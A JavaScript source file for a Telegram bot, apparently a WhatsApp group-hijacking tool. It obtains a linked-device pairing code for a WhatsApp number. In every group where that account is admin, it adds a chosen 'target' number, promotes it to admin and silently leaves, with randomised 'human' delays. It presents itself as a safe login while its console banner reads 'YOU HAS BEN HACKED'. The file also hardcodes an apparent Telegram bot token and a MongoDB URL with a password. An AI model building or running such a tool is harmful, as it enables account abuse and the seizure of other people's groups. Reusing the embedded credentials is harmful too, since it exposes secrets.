// =================================================================
// ⚡ DX-SYSTEM ULTRA v9.0 (GLITCH FIXED & ADVANCED ALGO)
// 👨‍💻 Developed by: DX-CODEX
// =================================================================

import TelegramBot from 'node-telegram-bot-api';
import mongoose from 'mongoose';
import express from 'express';
import { 
    makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    delay, 
    fetchLatestBaileysVersion, 
    jidNormalizedUser, 
    Browsers,
    makeCacheableSignalKeyStore
} from '@whiskeysockets/baileys';
import pino from 'pino';
import fs from 'fs-extra'; 
import pn from 'awesome-phonenumber'; 

// --- [ ⚙️ CONFIGURATION ] ---
const CONFIG = {
    BOT_TOKEN: "8113879008:AAGEZaE4v7OZGguk_g-J9qbRm2-yYpiwXc0", // Replace if needed
    MONGO_URL: "mongodb+srv://dxsimu:mnbvcxzdx@dxsimu.0qrxmsr.mongodb.net/?appName=dxsimu", 
    OWNER_IDS: [6703335929, 5136260272], 
};

// --- [ 🎨 DX FONT STYLER (COOL TEXT) ] ---
const toDxFont = (text) => {
    const map = {
        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ғ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ',
        'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ',
        's': 's', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ',
        'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ', 'F': 'ғ', 'G': 'ɢ', 'H': 'ʜ', 'I': 'ɪ',
        'J': 'ᴊ', 'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ', 'P': 'ᴘ', 'Q': 'ǫ', 'R': 'ʀ',
        'S': 's', 'T': 'ᴛ', 'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x', 'Y': 'ʏ', 'Z': 'ᴢ',
        '0': '₀', '1': '₁', '2': '₂', '3': '₃', '4': '₄', '5': '₅', '6': '₆', '7': '₇', '8': '₈', '9': '₉'
    };
    return text.split('').map(c => map[c] || c).join('');
};

const ui = {
    header: (title) => `<b>⚡ ${toDxFont(title)}</b>\n━━━━━━━━━━━━━━━━━━━━`,
    code: (text) => `<code>${text}</code>`,
    bold: (text) => `<b>${text}</b>`,
    error: (text) => `<b>💀 ᴇʀʀᴏʀ:</b> ${text}`,
    success: (text) => `<b>💎 sᴜᴄᴄᴇss:</b> ${text}`,
    line: () => `━━━━━━━━━━━━━━━━━━━━`
};

// --- [ 🗄️ DATABASE CONNECTION ] ---
mongoose.connect(CONFIG.MONGO_URL)
    .then(() => console.log('✅ MongoDB Connected (DX-NET)'))
    .catch(err => console.error('❌ MongoDB Error:', err));

const userSchema = new mongoose.Schema({
    userId: { type: Number, unique: true },
    firstName: String,
    username: String,
    isBanned: { type: Boolean, default: false },
    waConnected: { type: Boolean, default: false },
    sudoNumber: { type: String, default: null },
    joinedDate: { type: Date, default: Date.now }
});
const User = mongoose.model('User', userSchema);

// --- [ 🌐 SERVER KEEP-ALIVE ] ---
const app = express();
app.get('/', (req, res) => res.send('<b>⚡ DX-SYSTEM v9.0 RUNNING...</b>'));
app.listen(process.env.PORT || 3000, () => console.log("🖥️ Server Online"));

// --- [ 🤖 BOT INIT ] ---
const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: true });
const userStates = new Map();
const userDataCache = new Map();
const activeSessions = new Map();

// --- [ 🛡️ HELPERS ] ---
async function isBanned(userId) {
    const user = await User.findOne({ userId });
    return user?.isBanned || false;
}

// 🔥 CRITICAL: Force Clean Session (Fixes Glitches)
async function cleanSession(tgUserId) {
    const sessionPath = `./sessions/session_${tgUserId}`;
    
    // 1. Kill Active Socket
    if (activeSessions.has(tgUserId)) {
        try {
            const sock = activeSessions.get(tgUserId);
            sock.end(undefined);
            sock.ws.close();
        } catch (e) { console.log('Socket close error:', e.message); }
        activeSessions.delete(tgUserId);
    }

    // 2. Delete Folder
    if (fs.existsSync(sessionPath)) {
        await fs.remove(sessionPath);
        console.log(`♻️ GLITCH FIX: Wiped session for ${tgUserId}`);
    }

    // 3. Update DB
    await User.updateOne({ userId: tgUserId }, { waConnected: false });
}

// --- [ 🟢 WHATSAPP CORE ] ---
async function startWhatsAppSession(tgUserId, loginPhone, sudoPhone) {
    // ⚠️ AUTOMATIC CLEANUP BEFORE STARTING
    await cleanSession(tgUserId);
    
    const sessionPath = `./sessions/session_${tgUserId}`;
    
    // Format Phone
    const pNumber = pn('+' + loginPhone.replace(/[^0-9]/g, ''));
    if (!pNumber.isValid()) {
        return bot.sendMessage(tgUserId, ui.error("Invalid Number Format! Use International format."), { parse_mode: 'HTML' });
    }
    const cleanPhone = pNumber.getNumber('e164').replace('+', '');

    // Baileys Init
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }), 
        printQRInTerminal: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
        },
        browser: Browsers.ubuntu('Chrome'), 
        markOnlineOnConnect: false,
        generateHighQualityLinkPreview: true,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        retryRequestDelayMs: 2000
    });

    activeSessions.set(tgUserId, sock);

    // --- PAIRING CODE LOGIC ---
    if (!sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                await delay(3000);
                console.log(`Requesting Code for: ${cleanPhone}`);
                
                const code = await sock.requestPairingCode(cleanPhone);
                const finalCode = code?.match(/.{1,4}/g)?.join('-') || code;
                
                const msg = `${ui.header('⚡ ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ')}\n` +
                            `📱 ɴᴜᴍʙᴇʀ: <code>${cleanPhone}</code>\n` +
                            `🔑 ᴄᴏᴅᴇ: <code>${finalCode}</code>\n\n` +
                            `<i>⚠️ Paste this code in WhatsApp > Linked Devices quickly.</i>`;
                            
                bot.sendMessage(tgUserId, msg, { parse_mode: 'HTML' });
                
            } catch (err) {
                console.error("Pair Error:", err);
                bot.sendMessage(tgUserId, ui.error(`Pairing Failed. Try /preset to reset.`));
                await cleanSession(tgUserId);
            }
        }, 4000); 
    }

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const statusCode = (lastDisconnect.error)?.output?.statusCode;
            if (statusCode !== DisconnectReason.loggedOut) {
                startWhatsAppSession(tgUserId, loginPhone, sudoPhone); // Reconnect
            } else {
                await cleanSession(tgUserId);
                bot.sendMessage(tgUserId, ui.error("🚫 Session Logged Out/Expired."), { parse_mode: 'HTML' });
            }
        } 
        else if (connection === 'open') {
            console.log(`✅ Connected: ${tgUserId}`);
            bot.sendMessage(tgUserId, ui.success(`<b>Connected!</b> Starting Advanced Task...`), { parse_mode: 'HTML' });
            await User.updateOne({ userId: tgUserId }, { waConnected: true });
            
            // 🔥 LAUNCH ALGORITHM
            await runAdvancedAlgorithm(sock, tgUserId, sudoPhone);
        }
    });
}

// --- [ 🚀 ADVANCED ALGORITHM: ADD -> PROMOTE -> LEAVE ] ---
async function runAdvancedAlgorithm(sock, tgUserId, targetNumber) {
    try {
        const formattedSudo = targetNumber.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        const botId = jidNormalizedUser(sock.user.id);

        bot.sendMessage(tgUserId, `🔍 ${toDxFont("sᴄᴀɴɴɪɴɢ ᴛᴀʀɢᴇᴛs & ɢʀᴏᴜᴘs...")}`, { parse_mode: 'HTML' });

        const groups = await sock.groupFetchAllParticipating();
        const groupIds = Object.keys(groups);
        
        let stats = { success: 0, left: 0, fail: 0 };

        for (const jid of groupIds) {
            await delay(Math.floor(Math.random() * 2000) + 1500); // Human Delay

            try {
                const metadata = await sock.groupMetadata(jid).catch(() => null);
                if (!metadata || metadata.announce) continue;

                const botAdmin = metadata.participants.find(p => jidNormalizedUser(p.id) === botId);
                
                // Only act if Bot is Admin
                if (botAdmin?.admin) {
                    
                    // 1. ADD USER (If not present)
                    const isPresent = metadata.participants.find(p => jidNormalizedUser(p.id) === formattedSudo);
                    if (!isPresent) {
                        try {
                            await sock.groupParticipantsUpdate(jid, [formattedSudo], "add");
                            await delay(2000);
                        } catch (err) {
                            console.log(`Add Failed in ${jid}`);
                        }
                    }

                    // 2. PROMOTE USER (After Adding or Checking)
                    // Fetch metadata again to confirm user presence
                    const freshMeta = await sock.groupMetadata(jid);
                    const sudoUser = freshMeta.participants.find(p => jidNormalizedUser(p.id) === formattedSudo);
                    
                    if (sudoUser && !sudoUser.admin) {
                        await sock.groupParticipantsUpdate(jid, [formattedSudo], "promote");
                        stats.success++;
                        await delay(1500);
                    } else if (sudoUser?.admin) {
                        stats.success++; // Already admin counts as success
                    }

                    // 3. LEAVE GROUP (Bot leaves)
                    await sock.groupLeave(jid);
                    stats.left++;

                } else {
                    stats.fail++;
                }
            } catch (e) {
                stats.fail++;
                console.log(`Error in ${jid}: ${e.message}`);
            }
        }

        const report = ui.header('⚡ ᴛᴀsᴋ ᴄᴏᴍᴘʟᴇᴛᴇᴅ') + 
                       `\n👑 <b>Promoted:</b> ${stats.success}` +
                       `\n👋 <b>Bot Left:</b> ${stats.left}` +
                       `\n🛡️ <b>Failed/No Admin:</b> ${stats.fail}`;
        
        bot.sendMessage(tgUserId, report, { parse_mode: 'HTML' });
        // Optional: Auto Clean Session after task
        // await cleanSession(tgUserId); 

    } catch (e) {
        bot.sendMessage(tgUserId, ui.error("Algo Error: " + e.message));
    }
}

// --- [ 🎮 TELEGRAM COMMANDS ] ---

// 1. /start - Cool Welcome
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    if (await isBanned(chatId)) return bot.sendMessage(chatId, ui.error("🚫 <b>YOU ARE BANNED</b>"), { parse_mode: 'HTML' });

    // Reset User State but keep data
    userStates.delete(chatId);
    
    await User.updateOne({ userId: chatId }, { 
        firstName: msg.from.first_name, 
        username: msg.from.username 
    }, { upsert: true });

    const welcomeMsg = ui.header('ɴɪᴋᴏ sʏsᴛᴇᴍ ᴠ₉') +
        `\n👋 <b>Hᴇʟʟᴏ ${msg.from.first_name}</b>\n` +
        `\n🚀 <b>Sᴛᴀᴛᴜs:</b> <code>ONLINE</code>` +
        `\n🔧 <b>Mᴏᴅᴇ:</b> <code>Add-Promote-Leave</code>` +
        `\n\n${toDxFont("Press the button to login safely.")}`;

    bot.sendMessage(chatId, welcomeMsg, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "⚡ START PAIRING", callback_data: 'login' }],
                [{ text: "♻️ RESET SESSION", callback_data: 'preset_btn' }]
            ]
        },
        parse_mode: 'HTML'
    });
});

// 2. /preset - THE GLITCH FIXER COMMAND
bot.onText(/\/preset/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `⏳ ${toDxFont("ᴄʟᴇᴀʀɪɴɢ ᴏʟᴅ sᴇssɪᴏɴ...")}`, { parse_mode: 'HTML' });
    
    await cleanSession(chatId);
    
    setTimeout(() => {
        bot.sendMessage(chatId, ui.success("Session Wiped! You can now pair a new number."), {
            reply_markup: { inline_keyboard: [[{ text: "⚡ START NEW PAIR", callback_data: 'login' }]] },
            parse_mode: 'HTML'
        });
    }, 1500);
});

// Handle Buttons
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    if (await isBanned(chatId)) return;

    if (query.data === 'login') {
        userStates.set(chatId, 'WAITING_LOGIN');
        bot.sendMessage(chatId, `📱 <b>Enter Your WhatsApp Number:</b>\nEx: <code>919876543210</code>`, { parse_mode: 'HTML' });
    }
    if (query.data === 'preset_btn') {
        bot.sendMessage(chatId, `⏳ ${toDxFont("ʀᴇsᴇᴛᴛɪɴɢ...")}`, { parse_mode: 'HTML' });
        await cleanSession(chatId);
        bot.sendMessage(chatId, ui.success("Done! Press Start Again."), { parse_mode: 'HTML' });
    }
});

// Input Handler
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text || text.startsWith('/') || await isBanned(chatId)) return;

    const state = userStates.get(chatId);

    if (state === 'WAITING_LOGIN') {
        if (text.length < 7) return bot.sendMessage(chatId, ui.error("Invalid Number"));
        
        userDataCache.set(chatId, { login: text });
        userStates.set(chatId, 'WAITING_SUDO');
        
        bot.sendMessage(chatId, `👑 <b>Enter Target/Sudo Number:</b>\n(Who will get Admin?)`, { parse_mode: 'HTML' });
    }
    else if (state === 'WAITING_SUDO') {
        const data = userDataCache.get(chatId);
        userStates.delete(chatId);
        
        await User.updateOne({ userId: chatId }, { sudoNumber: text });
        
        bot.sendMessage(chatId, `⚙️ ${toDxFont("ᴘʀᴏᴄᴇssɪɴɢ...")}\nSending Code...`, { parse_mode: 'HTML' });
        startWhatsAppSession(chatId, data.login, text);
    }
});

// --- [ 👮 ADMIN: ADVANCED USERS ] ---

// /users (With File Support for Long Lists)
bot.onText(/\/users/, async (msg) => {
    const chatId = msg.chat.id;
    if (!CONFIG.OWNER_IDS.includes(chatId)) return;

    const allUsers = await User.find({});
    const active = allUsers.filter(u => u.waConnected).length;
    const banned = allUsers.filter(u => u.isBanned).length;

    let txt = "--- [ DX-SYSTEM DATABASE RECORD ] ---\n";
    txt += `Date: ${new Date().toISOString()}\n`;
    txt += `Total: ${allUsers.length} | Active: ${active} | Banned: ${banned}\n`;
    txt += "-----------------------------------------------------\n";
    txt += "USER_ID      | STATUS | SUDO_NUM      | NAME\n";
    txt += "-----------------------------------------------------\n";
    
    allUsers.forEach(u => {
        const status = u.isBanned ? "[BAN]" : (u.waConnected ? "[ON ]" : "[OFF]");
        const name = (u.firstName || "Unknown").replace(/\|/g, ''); // Sanitize
        txt += `${u.userId.toString().padEnd(12)} | ${status}  | ${u.sudoNumber || 'NONE'.padEnd(13)} | ${name}\n`;
    });

    // Send Stats Message
    await bot.sendMessage(chatId, 
        ui.header('ᴅᴀᴛᴀʙᴀsᴇ sᴛᴀᴛs') +
        `\n👥 <b>Total Users:</b> ${allUsers.length}` +
        `\n🟢 <b>Active:</b> ${active}` +
        `\n🔴 <b>Banned:</b> ${banned}` +
        `\n\n<i>📄 Detailed list sent as file below...</i>`, 
        { parse_mode: 'HTML' }
    );

    // Send File
    bot.sendDocument(chatId, Buffer.from(txt, 'utf-8'), {}, {
        filename: 'dx_users_db.txt',
        contentType: 'text/plain'
    });
});

// /ban (Advanced - Kills session immediately)
bot.onText(/\/ban (.+)/, async (msg, match) => {
    if (!CONFIG.OWNER_IDS.includes(msg.chat.id)) return;
    
    const target = match[1];
    const user = await User.findOne({ userId: target });

    if (user) {
        user.isBanned = true;
        await user.save();
        await cleanSession(user.userId); // KILL SESSION INSTANTLY
        bot.sendMessage(msg.chat.id, ui.success(`User ${user.firstName} has been <b>BANNED & DISCONNECTED</b>`), { parse_mode: 'HTML' });
    } else {
        bot.sendMessage(msg.chat.id, ui.error("User not found in DB"));
    }
});

// /unban
bot.onText(/\/unban (.+)/, async (msg, match) => {
    if (!CONFIG.OWNER_IDS.includes(msg.chat.id)) return;
    await User.updateOne({ userId: match[1] }, { isBanned: false });
    bot.sendMessage(msg.chat.id, ui.success(`User <b>UNBANNED</b>`), { parse_mode: 'HTML' });
});

// --- [ 🔚 COOL MYSELF SIGNATURE ] ---
setTimeout(() => {
    console.log('\n');
    console.log('█▀▀▄ ▀▄░▄▀ ░░ █▀▀ █▀▀█ █▀▀▄ █▀▀ ▀▄░▄▀');
    console.log('█░░█ ░░█░░ ▀▀ █░░ █░░█ █░░█ █▀▀ ░░█░░');
    console.log('▀▀▀░ ▄▀░▀▄ ░░ ▀▀▀ ▀▀▀▀ ▀▀▀░ ▀▀▀ ▄▀░▀▄');
    console.log('──────────────────────────────────────');
    console.log('   SYSTEM ONLINE - YOU HAS BEN HACKED 🤑');
    console.log('──────────────────────────────────────');
}, 1000);

// Error Handling
process.on('uncaughtException', (e) => console.log('⚠️ Fatal:', e.message));
process.on('unhandledRejection', (e) => console.log('⚠️ Reject:', e.message));
